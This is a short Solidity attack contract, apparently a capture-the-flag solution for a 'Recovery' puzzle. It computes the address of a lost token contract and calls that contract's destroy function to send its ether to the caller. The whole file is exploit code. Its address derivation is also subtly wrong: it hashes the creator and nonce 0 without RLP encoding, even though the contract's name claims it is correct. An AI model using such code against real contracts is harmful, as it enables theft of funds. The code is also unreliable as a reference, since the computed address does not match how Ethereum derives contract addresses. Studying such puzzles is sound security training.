pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}


contract RecoveryAttackerCorrect {
    address public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function computeAddress(address creator, uint256 inc) private pure returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(creator, inc));
        return address(uint160(hash));
    }

    function attack() public {
        address token = computeAddress(instance, 0);
        ISimpleToken(token).destroy(payable(msg.sender));
    }
}